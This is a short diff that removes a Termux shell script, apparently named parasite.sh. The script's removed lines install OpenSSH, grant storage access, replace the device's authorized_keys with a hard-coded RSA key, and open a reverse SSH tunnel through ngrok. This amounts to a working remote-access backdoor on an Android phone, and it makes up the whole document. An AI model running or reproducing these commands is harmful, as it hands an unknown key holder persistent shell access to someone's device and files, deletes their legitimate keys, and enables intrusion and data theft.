@@ -1,5 +1,0 @@
-chmod +x parasite.sh
-pkg install openssh -y
-termux-setup-storage
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqprmjJmmll7Q7QsuRcWbN50LBg6V9wgr5wy9I6AOFRyDCHeSOwIbhkaIgcKwPlCiGtvAV0qTAcdgbeNElA/eh0pkcWV7fmwC+nZPadwM1Jhr0CXk78f8oxUTGaAKlUe7W8vwgAVnB6ZSuynsz8mWvTolI8vkb7HpKCpZ3gDd/6ckXAQWGtqxt38lv5Z3Jlw4SZDu0ndhB2Qn5UHrhD4PnuHEsrqhtTfDOvxPjCGACJU+kdEaj0yFShlxhyf7dvrxsNN/Vbr1zhX99yllxKFCXkuJSaxFtyJN+NMZeLCt4lF4ZgAmqhwYlAW1o4cgXseUHfDDbN2vVmUb108/FzEtzbqZP40yqqPJ6RBYDSZjR19OnjJtM3VAT1/jjHKslTZp7UPHT6/UiI01//VYIGH8HNckIX5ssv/BumpNH4eswORdxEi28IgH1ZzL7pBfY6Pj/DKw20S/0nHOXSjca2Mlp7/geBA8BSHOQltILwQwQPwQdL4K+dpRiVv5+UFBxHcc= u0_a2756@localhost" > "/data/data/com.termux/files/home/.ssh/authorized_keys"
-ssh -i ngrok.key -R 0:localhost:8022 tunnel.us.ngrok.com tcp 8022
